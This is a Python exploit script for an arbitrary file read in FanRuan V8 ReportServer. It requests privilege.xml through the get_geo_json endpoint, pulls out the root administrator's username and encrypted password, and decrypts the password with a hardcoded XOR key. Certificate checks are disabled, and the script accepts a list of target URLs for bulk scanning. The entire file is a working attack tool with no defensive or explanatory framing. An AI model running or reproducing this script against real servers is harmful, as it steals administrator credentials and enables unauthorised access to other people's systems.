import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
import re
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
    }
    try:
        response = requests.get(target, verify=False, headers=headers, timeout=15)
        if response.status_code == 200 and 'CDATA' in response.text and 'xml' in response.text and 'xml' in response.text and 'PrivilegeManager' in response.text:
            root_manager_name_pattern = r'<rootManagerName>\s*<!\[CDATA\[(.*?)\]\]></rootManagerName>'
            root_manager_password_pattern = r'<rootManagerPassword>\s*<!\[CDATA\[(.*?)\]\]></rootManagerPassword>'
            user = re.search(root_manager_name_pattern, response.text).group(1)
            password = re.search(root_manager_password_pattern, response.text).group(1)
            password=password[3:]
            password_text=''
            ARRAY_KEY = [19, 78, 10, 15, 100, 213, 43, 23]
            for i in range(int(len(password) / 4)):
                c1 = int("0x" + password[i * 4:(i + 1) * 4], 16)
                c2 = c1 ^ ARRAY_KEY[i % 8]
                password_text = password_text + chr(c2)
            print(f"\033[31mDiscovered:{url}: FanRuanV8_ReportServer_ArbitraryFileRead---{user}/{password_text}!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")